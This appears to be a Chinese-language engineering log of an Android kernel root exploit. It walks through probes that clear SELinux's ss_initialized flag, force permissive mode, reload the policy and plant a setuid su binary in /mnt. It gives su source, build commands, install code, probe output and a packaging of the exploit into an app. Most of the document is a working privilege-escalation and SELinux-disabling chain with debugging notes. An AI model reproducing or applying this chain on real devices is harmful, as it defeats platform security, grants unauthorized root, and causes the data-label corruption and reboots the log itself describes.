`reset_security_ops()`（`0xffffffc0003f52e0`）是无参函数，
正好适配 RCU 回调（x0 被忽略）。理论上把 `security_ops` 指回
`default_security_ops` 就等于关掉 SELinux。

**实测：`C queue 00000000` 之后设备直接重启。**

分析：`selinux_disable()` 是四步 —— `reset_security_ops` → `avc_disable`
→ `selinux_nf_ip_exit` → `exit_sel_fs`。只做第一步，netfilter hook
还挂在 `selinux_ipv4_ops` 上，网络包一到就炸。而
`selinux_nf_ip_exit` / `exit_sel_fs` **都不在 kallsyms**（被裁剪），
没法复刻。这条路也死了。

## 14.3 probe52/53/54：`sel_write_disable` 的 -EINVAL 之谜（三个错误假设）

现象：以 kernel 域 open `/sys/fs/selinux/disable` 成功（fd=505），
但 `write(dfd, "1", 1)` 一直返回 `fffffea`(-EINVAL)。

**错误假设 A**：`*ppos != 0`。
→ probe53 加了 `lseek(dfd, 0, SEEK_SET)`，`A lseek 00000000` 成功，
   write 仍 -EINVAL。**排除。**

**错误假设 B**：`selinux_disabled` 被我们 `kwrite` 的副作用污染。
（因为 `kwrite(SS_INIT, 0)` 的副作用是 `*(u32*)(SS_INIT-20) += 1`）
→ probe54 在写之前/之后各 dump 一次 `SS_INIT-0x40 ~ +0x20`，
   逐字节对比（注意：`rphex` 把**每个字节**打印成 8 位十六进制，
   所以每行 0x20 字节 = 256 字符，一开始按 u32 解析全错了）：

```
off 2c  (SS_INIT -20)  00000000  ->  00000001   *** CHANGED
off 40  (SS_INIT  +0)  00000001  ->  00000000   *** CHANGED
```
只有这两个字变了。`SS_INIT-20` 确实被 +1（说明副作用模型是对的），
但这跟 disable 的 -EINVAL 无关。

**错误假设 C（也是真相所在）**：`selinux_disable()` 内部检查失败。
→ 翻 `kernel-exact/security/selinux/selinuxfs.c` 第 325 行：

```c
#else
#define sel_write_disable NULL      // ← 就是这一行
#endif
```

**真因：`CONFIG_SECURITY_SELINUX_DISABLE` 没开，内核根本没给
 `/sys/fs/selinux/disable` 注册 write 回调。** VFS 对没有 `.write`
的文件直接返回 `-EINVAL`。跟 `ss_initialized`、`selinux_disabled`
一点关系都没有。probe52/53/54 全在做无用功。

**硬结论 2：SELinux 无法通过 selinuxfs "disable" 关掉。**

## 14.4 关键源码发现：`selinux_enforcing == 0` 就等于全放行

翻 `kernel-exact/security/selinux/avc.c`：

```c
/* avc_denied() */
if (selinux_enforcing && !(avd->flags & AVD_FLAGS_PERMISSIVE))
    return -EACCES;                                    // 行 1049

avc_update_node(AVC_CALLBACK_GRANT, requested, cmd, ssid, tsid, tclass,
                avd->seqno, NULL, flags);              // ← 拒绝直接升级成允许
return 0;
```

也就是说 **`selinux_enforcing = 0` 就是彻底 permissive**，
而且被拒的判决还会被 `avc_update_node(AVC_CALLBACK_GRANT)` 改写成允许并缓存。
这正是 userdebug 机器上 `setenforce 0` 的机制。

再看 `ss/services.c:1072 security_compute_av()`：

```c
	if (!ss_initialized)
		goto allow;
	...
allow:
	avd->allowed = 0xffffffff;
```

**`ss_initialized == 0` 时所有判决都是 0xffffffff（全放行）。**
（这就是为什么 probe52 里 `F w 00000009 *** ROOT ***` 能成功写文件。）

## 14.5 `sel_write_enforce()` 的门槛

`selinuxfs.c:148`：

```c
	if (new_value != selinux_enforcing) {
		length = task_has_security(current, SECURITY__SETENFORCE);
		if (length) goto out;                // -EACCES
		...
		selinux_enforcing = new_value;       // ★ 这就是我们要的那次写
	}
```

而 `task_has_security()` 是 `avc_has_perm(tsec->sid, tsec->osid,
SECCLASS_SECURITY, SETENFORCE)`。

所以需要的组合拳：
1. `ss_initialized = 0` → `security_compute_av` 全放行；
2. `sid/osid` 用一个**从没在 avc 里出现过的值** → 保证 cache miss
   （`avc_search_node` 只按 (ssid,tclass,tsid) 匹配，**不校验 seqno**，
   旧判决会一直生效，所以必须换 key）；
3. `write("/sys/fs/selinux/enforce", "0")` → `selinux_enforcing = 0`。

**probe55 实测（一次成功）**
```
B kwrite 00000000 k 00000000        ← ss_initialized 清零成功
B ss 00000000
D write0 00000001                   ← ★ write 成功
G rf 000001fa n 00000001 v 00000030 ← ★ 读回 enforce = "0"
```
另外 `F restore fffff830`(-2000) → **写不回 1**。

## 14.6 新硬约束：4 字节写对同一地址只能成功一次

正确解析 dump 后（每字节 8 位十六进制），`SS_INIT` 附近的锚点表：

```
k=0  S=off28  sl_max=00800002  sl_count=00000000   OK   ← 唯一可用
k=1  S=off24  sl_max=00020000  sl_count=00800002   --
k=2  S=off20  sl_max=0000001e  sl_count=00020000   --
k=3..9                              sl_count=0       --
```

写入后副作用把 `sl_count`(off2c) 从 0 加到了 1，**k=0 的锚点被自己吃掉**，
k=1..9 的 `sl_count` 又都是 0（或 0x800002），全部不匹配。
所以 `ss_initialized` 在一次开机内**只能从 1 写成 0，写不回来**。

顺带算了 `selinux_enforcing`(`0xffffffc00187d47c`) 的锚点：
附近全是内核指针（`avc_node_cachep` / `avc_operation_node_cachep` /
`avc_callbacks` / `selinux_secmark_refcount`），`sl_count` 全是 8 位大数，
**一个锚点都没有** —— 这就是为什么早期的"直写 enforcing"一直被挡。

## 14.7 副作用：`ss_initialized=0` 会让内核在 ~40 秒后 panic

probe55 跑完（permissive 已生效）后，系统在 40 秒左右自己重启。
klogw 抓到的最后一段：

```
avc: denied { use } ... scontext=kernel tsid=518 tclass=fd permissive=0
SELinux: security_sid_to_context_core: called before initial load_policy on unknown SID 518
audit: audit_lost=134 audit_rate_limit=20 audit_backlog_limit=64
audit: rate limit exceeded
<日志到此中断>
```

`ss_initialized=0` 让所有 sid→context 转换失败，审计子系统被刷爆后崩掉。
（`panic_on_oops=1`，所以直接重启。）

**结论：`ss_initialized` 必须还原成 1**，不能放着不管。

## 14.8 出路：用 `/sys/fs/selinux/load` 让内核自己把 `ss_initialized` 置回 1

既然写原语只能写一次，就换个不需要写的手段 —— 让内核代码自己设置它。
`ss/services.c:2013 security_load_policy()`：

```c
	if (!ss_initialized) {          // ← initial-load 分支
		avtab_cache_init();
		policydb_read(&policydb, fp);
		selinux_set_mapping(...);
		policydb_load_isids(&policydb, &sidtab);
		security_load_policycaps();
		ss_initialized = 1;         // ★★★ 就是这一句
		seqno = ++latest_granting;
		selinux_complete_init();
		avc_ss_reset(seqno);
		...
		return 0;
	}
```

而 `sel_write_load()` 的权限检查是 `task_has_security(LOAD_POLICY)` ——
在 `ss_initialized=0` 的全放行状态下必过。

所以流程变成：
```
读 policy blob  →  kwrite(ss_initialized, 0)  →  write(enforce,"0")
                →  write(/sys/fs/selinux/load, blob)  →  ss_initialized 回到 1
```

### probe56：卡在 blob 来源

probe56 直接去读 `/sys/fs/selinux/policy`，结果：
```
C pfd ffffffea        ← open 返回 -EINVAL
```
翻 `ss/services.c:3389 security_read_policy()`：

```c
	if (!ss_initialized)
		return -EINVAL;
```

**读 policy 要求 `ss_initialized == 1`，而我们为了全放行刚把它清零 —— 死锁。**
所以必须**在清零之前**把 blob 读出来。

### probe57：改从 `/sepolicy` 读

设备上 `/sepolicy` 是普通文件（rootfs，0644，307380 字节），
和 `/sys/fs/selinux/policy` 大小完全一致，就是 init 开机 load 的那个 blob。
普通文件读取**不走任何 SELinux 的 security_* hook**，只要域有
`allow <域> rootfs:file read` 就行 —— kernel 域和 init 域都有。

probe57 的顺序：
```
A  mmap 8MB 缓冲
A  slurp /sepolicy          (kernel 域; 失败则换 init 域 sid=0x25; 再失败试 selinuxfs)
B  open /sys/fs/selinux/enforce
C  kwrite(ss_initialized, 0)
D  set_tsec(sid=0x5f5) → write(enforce, "0")   → 读回 selinux_enforcing
E  set_tsec(sid=0x25, osid=0x7777) → write(/sys/fs/selinux/load, blob)
F  读回 ss_initialized 与 selinux_enforcing
G  独立 open+read(force) 复核
```

判据：`F ss 00000001` 且 `F enf 00000000`。

## 14.10 ★ probe57 成功：SELinux 死结拿下

### 两个新踩的坑

**坑 1：提权后 mmap 一律 -EACCES。**
probe57 第一版把 8MB 策略缓冲放在提权之后 mmap，结果五个地址全失败：
```
A mmap0 fffffff3      (0x21000000, MAP_FIXED)
A mmap1 fffffff3      (0x20000000, MAP_FIXED)
A mmap2 fffffff3      (0x40000000, MAP_FIXED)
A mmap3 fffffff3      (0x10000000, MAP_FIXED)
A mmap4 fffffff3      (内核自选地址)
```

`override_creds` 之后 `mmap` 全部返回 `-EACCES`（probe56 同样调用却能成，
差异目前没定位，但结论够用）。
→ **对策：所有需要的大块缓冲都在提权前 mmap 好。**
probe57 里改成在 `rp_open()` 之后（还在 shell 域）就
`mmap(0x21000000, 2MB, MAP_FIXED|ANON)`，`P0 pb 21000000` 一次成功。

**坑 2：`security_read_policy()` 要求 `ss_initialized == 1`。**

`ss/services.c:3394` 里就是 `if (!ss_initialized) return -EINVAL;`。
但我们正是为了全放行才刚把它清零 —— 死锁。
→ **对策：blob 从 `/sepolicy` 读**（rootfs 普通文件，307380 字节，
和 selinuxfs 里那份完全一致），普通文件读取不经过任何 `security_*` hook。

### 副作用与已知瑕疵

- 回灌策略会**重建 sidtab**（`policydb_load_isids`），动态分配的 sid 全部丢失，

- 这套动作**不持久**：重启后 `selinux_enforcing` 回到 1。

## 第 10 轮：root 落地 —— 从"有 uid 0"到"有可用的 su"（probe58 ~ probe59）

第 9 轮结束时，状态是：**能拿到 uid 0 + 全 caps + 全局 permissive，但系统里没有任何东西能被 App 调用。**
用户的原话和要求很明确：*"我要的 root 是功能，能有 su 能被 app 调用"*。
所以这一轮的唯一目标就是：**往系统里放一个 setuid-root 的 `su` 可执行文件。** 听起来是最简单的一步，实际踩了两个大坑。

### 15.1 首选的落点 /system/xbin 直接撞墙（probe58）

Android 上 su 的惯例位置是 `/system/xbin/su`。probe58 就是 probe57 + 一段安装逻辑：
读 `/data/local/tmp/su` → `mount(/system, MS_REMOUNT, "rw")` → 写 → `chmod 06755` → `chown 0:0`。

实测结果：

```
H mnt-rw ffffffff       ← mount(MS_REMOUNT, "/system", "rw") = -EPERM
H verify fd fffffffe    ← open("/system/xbin/su", O_CREAT) = -ENOENT/被拒
```

`-EPERM` 出现在 mount 而不是 open，说明问题不在 SELinux（此时已经是 permissive），
而在更底层。查证：

```
$ adb shell cat /proc/mounts | grep -E " /system "
/dev/block/dm-0 /system ext4 ro,seclabel,relatime,data=ordered 0 0
$ adb shell cat /sys/block/dm-0/ro
1
```

**根因：`/system` 挂在 `dm-0`（dm-verity 保护的只读映射）上，
块设备本身的 `ro` 标志就是 1。** 这种情况下 `MS_REMOUNT` 一定会被 VFS 挡回 `-EPERM`，
和 SELinux、和 uid 是不是 0 **完全无关**。想让 `/system` 可写，得先 `dmsetup` 把 dm-0
换成非 verity 的映射 —— 那需要改 devicetree / 刷 boot，在 BL 锁着的前提下不现实。

> **结论：`/system` 这条路彻底封死。** 这一条要写进最终方案的设计约束里。

### 15.2 换落点：rootfs 上的 /sbin（probe59）

`/system` 不行，但还有另一块可写的地方 —— **rootfs**：

```
rootfs / rootfs ro,seclabel 0 0
```

三个关键性质让它成为理想落点：

1. **`ro` 只是 mount flag，不是块设备属性。** rootfs 是 ramfs（内存文件系统），
   没有底层只读设备，`mount(MS_REMOUNT, "/", "rw")` 就能写。
2. **没有 `nosuid`。** 这一点最要命 —— `/data` 分区是带 `nosuid` 的，
   放进去的 setuid 位会被内核直接忽略；rootfs 的挂载选项里没有 `nosuid`，setuid 真实有效。
3. **`/sbin` 在 App 的 PATH 里。** Android 的 `PATH` 是
   `/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin`，
   `/sbin` 排在最前面 —— App 里 `Runtime.exec("su")` 能直接命中。

而且 `/sbin` 本来就存在（`drwxr-x--- root root`），不需要新建目录。

probe59 的安装段：

```c
long sulen = slurp("/data/local/tmp/su", (u64)pb, (long)POL_MAX);   // 复用策略缓冲
/* H capeff：读 myCred+0x38 确认 CAP_SYS_ADMIN 真的在 */
/* H tmpfs：试 mount tmpfs 到 /data/local/tmp/xb（备选方案探测） */
/* H sys-rw：复验 /system remount（预期 -EPERM） */
long r1 = sysc(40, 0, (long)"/", 0, 32, (long)"rw", 0);   // MS_REMOUNT, "/" -> rw
if (sulen > 0) {
    int of = openat_(-100, "/sbin/su", O_WRONLY | O_CREAT | O_TRUNC);
    long w  = write_(of, (const void *)pb, sulen);
    fsync_(of); close_(of);
    sysc(53, -100, (long)"/sbin/su", 06755, 0, 0, 0);      // chmod 06755
    sysc(54, -100, (long)"/sbin/su", 0, 0, 0, 0);          // chown 0:0
}
```

### 15.3 su 本体：768 字节的 freestanding 程序（exploit/su/su.c）

不能用 NDK 编译（会拉进 libc，体积几 MB，还要处理动态链接器路径）。
直接用 `clang --target=aarch64-linux-gnu -ffreestanding -nostdlib` 编一个裸 ELF，
入口手写汇编取出 `argc/argv/envp`：

```asm
.global _start
_start:
    mov x0, sp
    bl  cstart
    b   .
```

```c
void cstart(unsigned long *sp)
{
    int argc = (int)sp[0];
    char **argv = (char **)&sp[1];
    char **envp = argv + argc + 1;
    setresgid_(0, 0, 0);
    setresuid_(0, 0, 0);
    if (getuid_() != 0) { say("su: cannot become root\n"); exit_(1); }
    // su -c "cmd"  ->  /system/bin/sh -c "cmd"
    // su           ->  /system/bin/sh
    execve_("/system/bin/sh", av, envp);
}
```

为什么是 setuid 二进制而不是别的形式：
- App 里的 uid 是 `u0_aXX`，执行 `06755 root:root` 的文件时，内核在 `execve`
  里会把 euid 提到 0 —— 这是 setuid 位的标准语义，不依赖任何 SELinux 策略。
- 此时全局 permissive，`execve` 之后的 `setresuid(0,0,0)` 也不会被拦。

编译 + 打包成裸 ELF（`mkelf.py` 把 `.o` 拼成最小 ELF64 头，剥掉所有 section）：

```
clang --target=aarch64-linux-gnu -O2 -ffreestanding -fno-builtin -nostdlib \
      -fno-stack-protector -c su.c -o su.o
python3 ../probe/mkelf.py su.o su
```

产物 **768 字节**，md5 `dc3557c54a44df3797d682973f52d4f3`。

### 15.5 真因：`MNT_LOCK_READONLY`（probe60 找到，但引入了新崩）

翻 `kernel-exact/fs/namespace.c:1797` 的 `do_remount()`，`-EPERM` 只有 5 个来源：

```c
	if ((mnt->mnt.mnt_flags & MNT_LOCK_READONLY) && !(mnt_flags & MNT_READONLY))
		return -EPERM;                                   // 1816
	if ((mnt->mnt.mnt_flags & MNT_LOCK_NODEV) && !(mnt_flags & MNT_NODEV))
		return -EPERM;                                   // 1827
	if ((mnt->mnt.mnt_flags & MNT_LOCK_NOSUID) && !(mnt_flags & MNT_NOSUID))
		return -EPERM;                                   // 1832
	if ((mnt->mnt.mnt_flags & MNT_LOCK_NOEXEC) && !(mnt_flags & MNT_NOEXEC))
		return -EPERM;                                   // 1836
	if ((mnt->mnt.mnt_flags & MNT_LOCK_ATIME) &&
	    ((mnt->mnt.mnt_flags & MNT_ATIME_MASK) != (mnt_flags & MNT_ATIME_MASK)))
		return -EPERM;                                   // 1840
```

而 `MNT_LOCK_READONLY` 只在 `clone_mnt()` 的 `CL_UNPRIVILEGED` 分支里被设（`namespace.c:835`）——
也就是"把挂载树复制进一个权限更低的 namespace"时，给只读挂载补上这个锁。
于是第一版假设是：`adb shell` 被 unshare 进了一个克隆 namespace，所以锁只在我们这层。

probe60 因此先 `setns(/proc/1/ns/mnt)` 再 remount。**结果设备静默卡死**：

```
I0 su-len ...  之后就没有了 (报告停在 G rf)
```

内核日志里**没有任何 panic / Oops / BUG / watchdog 记录**，最后一行停在策略回灌那一刻：

```
[84.00] SELinux: 2048 avtab hash slots, 13755 rules.
        SELinux:  Completing initialization.
        SELinux:  Setting up existing superblocks.
[84.00] SELinux: mount invalid.  Same superblock, different security settings for (dev mmcblk0p3, type vfat)
```

—— 是"卡死"（audit/avc 风暴 + 后续文件 I/O 触发），不是崩溃。

> 结论：**策略回灌之后不要再碰 /data 上的文件 I/O**。所有"读"必须提前做完。

### 15.6 probe61：我们本来就在初始 namespace

probe61 做了三件事：把读 su 提前、去掉 setns、加标记点。结果：

```
I0 su-len fffffff3          ★ 读 su 失败 = -EACCES
                            原因: 此刻还在 enforcing, cred->security 是 kernel 域,
                            而 su 文件是 shell_data_file => 被拒. (纯粹是我把读提前了)
H ns-self mnt:[4026531840]  ★★★ 我们自己就是初始 namespace!
H ns-init fffffff3          /proc/1/ns/mnt = -EACCES (被 /proc 的 hidepid 挡住)
H nfd fffffff3 setns ffffffff
```

**4026531840 = 0xF0000000，就是内核的初始 mount namespace。**
所以根本不需要 `setns`——`MNT_LOCK_READONLY` 那个假设是错的（它是给 unprivileged
clone 用的，我们没被 clone）。

那么 `/` 的 -EPERM 只剩一个候选：**`MNT_LOCK_ATIME`**。
因为我们之前只传 `MS_REMOUNT`(32)，atime 位算出来是 0；
如果 mount 上带着 `MNT_RELATIME`，`MNT_ATIME_MASK` 就对不上 → 直接 -EPERM。

**这一版还顺带确认：整套链在 probe61 里跑完 `== DONE ==` 且设备全程没重启。**
（说明之前的卡死确实是"回灌后再读 /data"导致的，不是 setns。）

### 15.7 probe62：挂载标志矩阵，锁定 `MNT_LOCK_READONLY`

把 5 种标志组合都试一遍（`data=NULL` 绕开 `selinux_sb_remount`）：

```
J f1 ro0     00000000   MS_REMOUNT|MS_RDONLY            -> 成功
J f2 rel     ffffffff   MS_REMOUNT|MS_RELATIME          -> -EPERM
J f3 relsn   ffffffff   +NOSUID|NODEV                    -> -EPERM
J f4 noat    ffffffff   MS_REMOUNT|MS_NOATIME           -> -EPERM
J f5 zero    ffffffff   MS_REMOUNT（atime 位与挂载点一致）-> -EPERM
```

`f5` 的关键意义：它请求的 mnt_flags 全 0，和 `/` 实际的 atime 位一致，
既不涉及 NOSUID/NODEV/NOEXEC，也不涉及 ATIME 错配 —— **只剩 `MNT_LOCK_READONLY` 一条**。
`/` 的 remount rw 是彻底没戏了（这是 Android 给 rootfs 加的死锁）。

### 15.8 换落点：`/mnt`（tmpfs，rw，无 nosuid）—— 一步到位

放弃 remount 思路，直接去 `/proc/self/mountinfo` 里找"可写 + 无 nosuid + 无 noexec"的挂载点：

```
/            0:1   rootfs   ro                         -> 不可写
/system      253:0 ext4     ro                         -> dm-0 块设备 ro=1 + dm-verity
/data        259:11 ext4    rw,nosuid,nodev            -> nosuid => setuid 无效
/mnt         0:17  tmpfs    rw,relatime   mode=755      -> ★ 全中
```

**`/mnt` 是 init 挂的 tmpfs**：
- `rw` → 直接就能写，不需要任何 mount 操作；
- 没有 `nosuid` → setuid 位真实有效；
- 没有 `noexec` → 能执行；
- 属于共享传播组 `shared:14`，各 app 的 mount namespace 都是它的克隆，
  **共用同一个 super_block**，所以写进去的文件对所有进程立即可见；
- 在内存里，**不碰任何 flash 分区，零变砖风险**，重启自动消失。

### 15.9 probe63：写进去了，但 setuid 位没了

```
P0 su-len 00000300       把 su 读进来（提前，shell 域，成功）
H ofd 000001fc           open("/mnt/su", O_CREAT) 成功
H written 00000300       写 768 字节成功
H chmod 00000000 chown 00000000
---
宿主: -rwxr-xr-x root root 768 /mnt/su     ← ★ s 位不见了
      su -c id -> cannot become root
```

**原因：POSIX 规定 `chown` 会强制清掉 `S_ISUID`/`S_ISGID`。**
我们是先 `chmod 06755` 再 `chown 0:0`，最后那次 chown 把 s 位抹掉了。
而这台机器上 chown 又是必须的（rootfs/tmpfs 里新建文件属主是当前 uid，
虽然我们已经 cred=root，但保险起见还是要 chown）。

**`adb shell`（uid 2000）执行 `/mnt/su -c id` 直接拿到 `uid=0(root)` —— su 真的能用了。**

至此"功能意义上的 root"达成：
1. 内核任意读写 + 提权（uid 0 / 全 caps）

### 16.5 同一个 exploit 从 App 里跑，撞的两个新坑

把 exploit 原样塞进 APK，第一次跑直接卡在 spray 之前：

```
L 00000400/00001000      RLIMIT_NOFILE soft=1024 hard=4096
L2 00001000              只能把 soft 顶到 hard
M 0c00000030000000       FAKE/RBUF 的 mmap 正常
S 00000000/00000000/00000000   ★ 590 个 socket 一个都没建起来
ser=fffffff3             ★ socket(AF_INET,...) = -EACCES
Jfffffff7                setsockopt(-13) -> EBADF
```

**坑 1：fd 上限。** app 进程的 `RLIMIT_NOFILE` soft=1024/hard=4096，
而 spray 要 590 个 fd。提权前没有 `CAP_SYS_RESOURCE`，只能把 soft 顶到 hard（1024→4096）。
加了 `getrlimit(163)` / `setrlimit(164)` 之后这一条解决。

**坑 2：没声明 INTERNET 权限，SELinux 连 socket 都不让建。** 这个才是真正致命的：
`-EACCES` 不是 fd 用尽（那是 EMFILE），而是 SELinux 的
`selinux_socket_create` 把 `untrusted_app` 域对 `socket` 类的 create 拒了 ——
因为**没有 INTERNET 权限的 app 不在 `netdomain` 里**。
在清单里加上

```xml
<uses-permission android:name="android.permission.INTERNET"/>
```

之后，`S 500/60/30` 全部建成功，整条链在 App 进程里一次跑通。

> 这是个很容易漏的点：我们在 shell 里测了几十轮，shell 域天然有网络权限，
> 直到搬进 app 才暴露。以后凡是"shell 能跑、app 不能跑"，先怀疑权限声明。

**因果链**：提权链必须把 `ss_initialized` 清零再回灌 policy（见 14.8）。
在清零到回灌完成的几百毫秒里，`selinux_inode_init_security()` 失败，
这期间任何进程新建的文件都会**永久失去标签**（变成 unlabeled）。
恰好那一刻 system_server 在写最近任务缩略图。SystemUI（platform_app 域）
在 enforcing 下连 getattr 都做不了 → fd 无效 → 崩溃循环。

文件本体完好（不是 ext4 损坏），只是 xattr 缺失。**不需要重置手机。**

### 17.3 修复思路的三个约束

1. `restorecon` 需要 `CAP_MAC_ADMIN`，而 `/mnt/su` 从 adb shell 链路继承的
   bounding set 只有 0xc0（SETUID|SETGID），**做不了 relabel**；
2. 所以自愈必须放进 exploit 进程内（fake cred 是全 caps）；
3. 回灌 policy 之后系统极不稳定（连 panic 两次），所以修复动作要放在
   **回灌之前**，就算之后崩了，磁盘上的修复也已落盘。

### 17.9 二次复发（15:03）与 probe70 全量 relabel 方案（15:14）

GMS prefs、甚至 com.z5.root 自己，**说明这次 panic 前窗口期更长**（窗口机制
见 17.2，每轮 exploit 触窗都会留下新污染，当天多次尝试叠加）。

关键新认知：
1. 修复不能只删 Recents 缓存——污染是随机的，删除要枚举文件不现实；
2. relabel（改 security.selinux xattr）才是通用解。约束：
   - setxattr 需要 CAP_MAC_ADMIN —— 只有 exploit 进程（fake cred 全 caps）有；
   - security_context_to_sid 在 !ss_initialized 时只会匹配 initial sid 字符串，
     正常 context 会 -EINVAL —— **relabel 必须放在回灌之后**做；
   - 此时 enforce=0（permissive）+ 全 caps，任意域访问任意文件都放行，
     kernel 域"太穷"的问题不存在了。
3. 标签来源（15:08 实测设备策略文件）：
   - /file_contexts: `/data(/.*)?  u:object_r:system_data_file:s0` 通用规则;

     untrusted_app/platform_app 的类别都是 c512,c768）。

probe70s 设计：probe69s + 回灌后的 relabel 阶段（纯系统调用，无 fork）：
- lgetxattr(9)/lsetxattr(6) 判断 `security.selinux` 缺失或 == unlabeled 才改，
  正常标签的条目（packages.xml 等）一律不碰；
- 系统根目录（/data/system、system_ce、misc、media、app、idd 等）子树用
  父目录上下文继承；App 根（/data/user/0、/data/user_de/0）下每个应用目录
  用 app_data_file:s0:c512,c768；
- 窗口里的 Recents 缓存删除保留（保证 SystemUI 崩溃循环必断），
  其余污染靠 relabel 保数据（accounts.xml / packages.list 不丢）。
- 编排判据改为 rep.bin 出现 "K rel"。

### 17.10 复发后的四个真 bug —— probe70 的调试全过程（16:00 ~ 16:55）

用户在 App 里点 root 后 panic 重启，SystemUI 崩溃循环再次复发（15:03）。
这次污染面更大（packages.list / accounts.xml / 数十个 GMS prefs / 本 App 目录），
于是改成"通用 relabel"方案，其间挖出四个长期埋着的 bug：

**bug1: arm64 的 O_DIRECTORY 不是 0x10000。**
`arch/arm64/include/uapi/asm/fcntl.h` 里 `O_DIRECTORY = 040000 = 0x4000`，
asm-generic 的 00200000 在 arm64 上是无效位 -> openat 返回 **-EINVAL**。
后果：`purge_dir()`（清 Recents 缓存）从加进去那天起就没成功过，
`K del 0` 一直被误读成"目录已空"，实际是目录根本没打开。
对照实验（一次跑 5 个探针）：
```
K p0 ffffffea pA ffffffea pB 000001fb pC ffffffea pD 000001fb
        (O_DIRECTORY 全 -EINVAL;  O_RDONLY 全成功)
```

**bug2: 指针数组放 .data 需要 .rela.data，而 mkelf.py 只处理 .rela.text。**
`static const char *roots[] = {...}` 编译后 .data 里是指针，链接期地址在
运行时全是垃圾 -> openat 拿野指针 -> 全部 -EFAULT。改成二维字符数组
`static const char roots[][24] = {...}` 才正确（.data 里直接是字节）。

**bug3: clone 给子线程的 sp 不能贴着映射顶端。**
原来 sp = STACK2 + 0x3ff00（映射 0x33000000 起 0x40000），clone 返回后
编译器会用正偏移栈槽，一越界就 fault 在 0x33040150 = sp + 0x250，
**整个进程静默消失**（rep.bin 停在 P0，无任何 oops 记录）。
只要代码布局一改就会踩中。改为 sp = STACK2 + 0x38000，留 0x8000 富余。

**bug4: permissive 下全盘遍历 = audit 洪水 = 整机崩。**
第一版 relabel 遍历 /data/system + 所有 app 目录，每个文件产生 3~4 条
avc 审计；kmsg 被打爆（dmesg 末尾 `audit: rate limit exceeded`，
audit_lost=2628），90 秒时整机重启。
改成定向列表：packages.list / accounts.xml / recent_tasks.utf8 +
GMS、本 App 的 shared_prefs（深度 2），一次只扫 156 条，秒级完成。

**顺带修的两个工程坑：**
- `path_exists` 用 O_DIRECTORY 对**文件**必然 -ENOTDIR -> 加 `file_exists`（O_RDONLY）；
- `adb push` 赶上开机繁忙会写出 0 字节文件 -> 必须 md5 校验 + 重试；
  `adb pull` 失败时 /tmp 里残留的旧报告会造成"假成功"-> 每轮用新文件名。

**最终验收（16:48 干净重启，enforcing=1）：**
```

SystemUI 进程：存活
/sdcard 读写：正常      pm list packages：正常
剩余 unlabeled 拒绝：163 条/2 分钟（events / rcanonc_1892(idd 遥测) /
                    packages.list(日志命名用) / 几个 GMS analytics prefs）
```
即：**崩溃循环彻底消失，功能正常**；剩余 unlabeled 只是日志噪声，

### 18.4 ★ 硬结论：普通 App 调不动 su（CapBnd=0）

实测 `su -c id`：
- 从 adb shell：`uid=0(root) ... groups=...` ✅
- 从 App（`ProcessBuilder("/mnt/su","-c","id")`）：**exit 1，无输出** ❌

根因（/proc 直接读出来的）：

```
com.z5.root (app) : CapBnd: 0000000000000000   CapEff: 0000000000000000
adb shell         : CapBnd: 00000000000000c0   （SETUID|SETGID）
```

Android 给 App 进程的 **capability bounding set 是空的**。setuid-root exec 只把
euid 抬到 0，permitted 仍是 0；随后 `setresuid(0,0,0)` 需要 CAP_SETUID，被拒 →
`getuid()!=0` → su 打印错误并 `exit(1)`。

**这不是 bug，是 Android 的设计**：任何 setuid 文件都不能让 App 拿到 root。
所以"App 直接 exec /mnt/su"这条路物理上不通，`/mnt/su` 只对 adb/root shell 有意义。

### 18.5 要满足"任意 App 能调 root"，只能换架构

2. **每个需要的 App 自己跑一次 exploit**：把 z5root 打进目标 App，用的时候在
   自己进程里提权。缺点：每次都要冒一次 panic 风险。
3. （不可行）Magisk/KernelSU：BL 锁未解，改不了 boot.img。

## 23. 23:22 又一次"点 root 就黑屏重启" —— 真因是我们自己造出来的

   → **su 已经装好了**（S13~S15 全过），exploit 本身是成功的，
   死在 `/data/system` 整树重打标签那一步。

2. `dumpsys dropbox`：23:22:26 只有 `event_log_start`（即新 boot 的第一条），
   上一 boot 结束前**没有任何** `system_server_crash` / `SYSTEM_TOMBSTONE` /
   `SYSTEM_FSCK`。配合"重启后没跑 fsck"，说明是**进程有序重启**
   （sysrq/reboot，而不是断电）。也就是说：system_server 又一次崩了，
   但因为 `/data/system` 不可写，连 crash 记录都没能落盘。

### 23.2 真因：`security_load_policy()` 走了"开机首次加载"分支

`kernel-exact/security/selinux/ss/services.c:2006`：

```c
int security_load_policy(void *data, size_t len)
{
    ...
    if (!ss_initialized) {                    // ← 我们把标志清 0 了
        policydb_read(&policydb, fp);
        ...
        policydb_load_isids(&policydb, &sidtab);   // ★ sidtab 整个重建
        ss_initialized = 1;
        ...
    }
    /* 正常路径: sidtab_shutdown + sidtab_map(clone_sid) + sidtab_map(convert_context) */
```

- 正常（`ss_initialized==1`）路径会 **克隆旧 sidtab 并逐个转换 context**，
  编号全部保留 —— 这就是内核热更新策略不出事的原因。
- 我们把 `ss_initialized` 清成 0，于是走"首次加载"分支：
  `policydb_load_isids()` 把 sidtab **从零重建**，只保留 policy 里
  那几十个 initial sid；开机以来动态创建的**几万个 sid 全部作废**。
- 之后所有 inode / 进程身上的旧 sid 都 `sidtab_search()` 不到
  → 全系统"unlabeled"假象 → system_server 写 `/data/system` 被拒
  → `SettingsState` 抛异常 → 崩 → Sony 的 `Do sysrq` → 重启。

**结论：`/data/system` 污染、相机 `Fail to get camera info`、
SystemUI 崩溃循环、`Unable to backup user packages state file`、
`/idd` 每秒几十条 avc —— 全是这一个自伤动作的后果。**
probe70~77 里那几百行 relabel 补丁，全部是在给这个自伤擦屁股。

### 23.3 顺带解释掉的两个老疑点

- 为什么 `is_unlabeled()` 说没问题、`ls -Z` 却是 unlabeled：
  xattr 是"应该是什么"，内核 inode 里缓存的 sid 才是"实际是什么"。
  sidtab 一重建，两者就永久分叉了。
- 为什么 `rel_walk("/data/system")` 期间最容易崩：
  从 S5 清标志到 S17 打完标签之间，整个 `/data/system` 都是"查不到 sid"
  的状态；任何一次 system_server 的写都踩雷。遍历 1117 项要几秒，
  这个窗口越长，中招概率越高。**这次就是踩在窗口里。**

### 23.4 新方案（probe78，正在验证）

既然病根是"我们自己把 sidtab 砸了"，那正确做法是**根本别碰它**：

- 不清 `ss_initialized`，不回灌 policy ⇒ sidtab 全程完好，零污染，
  也就不需要任何 relabel（`/data/system`、相机、`/idd` 全部自愈）。
- 提权后把当前任务的 sid 换成 `init`（0x25，实测值，高权域）：
  用它来 `setenforce 0` + 写 `/mnt/su`。
